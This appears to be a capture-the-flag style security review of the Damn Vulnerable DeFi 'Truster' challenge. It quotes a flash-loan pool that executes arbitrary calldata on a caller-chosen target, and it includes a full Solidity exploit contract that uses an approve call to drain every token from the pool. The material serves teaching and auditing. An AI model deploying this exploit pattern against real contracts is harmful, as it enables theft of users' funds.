# Truster

Truster is a [damnn vulnerable defi challenge](https://www.damnvulnerabledefi.xyz/challenges/3.html), a new pool has launched that is offering flash loans of DVT tokens for free.

# Introduction

<!-- TODO  -->
Truster offers flash loans of DVT tokens for free, currently the pool has 1 milion DVT tokens in balance.

The focus of the security review was on the following:

1. Ensure that the system is implemented consistently with the intended functionality, and without unintended edge cases.
2. Identify known vulnerabilities particular to smart contract systems, as outlined in our [Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/), and the [Smart Contract Weakness Classification Registry](https://swcregistry.io/).

*Disclaimer:* This security review does not guarantee against a hack. It is a snapshot in time of brink according to the specific commit by a one person. Any modifications to the code will require a new security review.

# Findings 

## Critical Risk
### Theft of all DVT tokens

**Severity:** Critical

**Context:** [`TrusterLenderPool.sol#L21-L41`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/truster/TrusterLenderPool.sol#L21-L41)

**Description:**
The contract have a function named as `flashLoan`, using this function we can borrow an amount of DVT tokens, this function receive amount to borrow `borrowAmount`, borrower address `borrower`, token address `target` and function called in token `data`.

```solidity
contract TrusterLenderPool is ReentrancyGuard {
    ...
    function flashLoan(
            uint256 borrowAmount,
            address borrower,
            address target,
            bytes calldata data
        )
            external
            nonReentrant
        {
            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
            
            damnValuableToken.transfer(borrower, borrowAmount);
            target.functionCall(data);

            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
}
```

Using this function an attacker is able to stole all DVT Tokens, creating an exploit contract that call the `flashLoan` function, and passing this value in `data` parameter: `approve(address(this),type(uint).max)`.

```solidity
contract TrusterExploit {
    function attack(address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token); 

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint).max);
        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
}
```

In the code above, the exploit encode the data `approve(address(this),type(uint).max)` and send it via `pool.flashLoan` with the rest of the parameters, and this approve your contract to receive unlimited amount of DVT tokens.
And the following line transfers the entire TrusterLenderPool balance to the exploit contract.

**Recommendation:**
```diff
+ Do not execute data sent by an external contract within the functionCall.
- ...
```